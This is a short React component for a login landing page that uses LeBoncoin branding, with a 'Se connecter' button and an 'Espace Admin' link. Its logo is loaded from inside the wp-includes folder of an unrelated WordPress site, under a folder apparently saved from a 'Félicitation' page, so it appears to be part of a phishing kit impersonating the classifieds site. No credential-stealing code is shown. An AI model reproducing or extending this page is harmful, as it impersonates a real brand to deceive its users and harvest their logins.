
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";

const Index = () => {
  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white">
      <div className="w-full max-w-md px-4 py-8 text-center">
        <div className="mb-8">
          <img 
            src="https://shobha-yadav.dmlearning.in/wp-includes/html-api/lbc/Félicitation_fichiers/lbc-front-web-logo.svg" 
            alt="LeBoncoin Logo" 
            className="h-12 mx-auto"
          />
        </div>
        
        <div className="space-y-4">
          <Link to="/" className="w-full block">
            <Button className="w-full bg-leboncoin-orange hover:bg-leboncoin-orange/90">
              Se connecter
            </Button>
          </Link>
          
          <Link to="/admin" className="w-full block">
            <Button variant="outline" className="w-full border-leboncoin-orange text-leboncoin-orange hover:bg-leboncoin-orange/10">
              Espace Admin
            </Button>
          </Link>
        </div>
      </div>
    </div>
  );
};

export default Index;
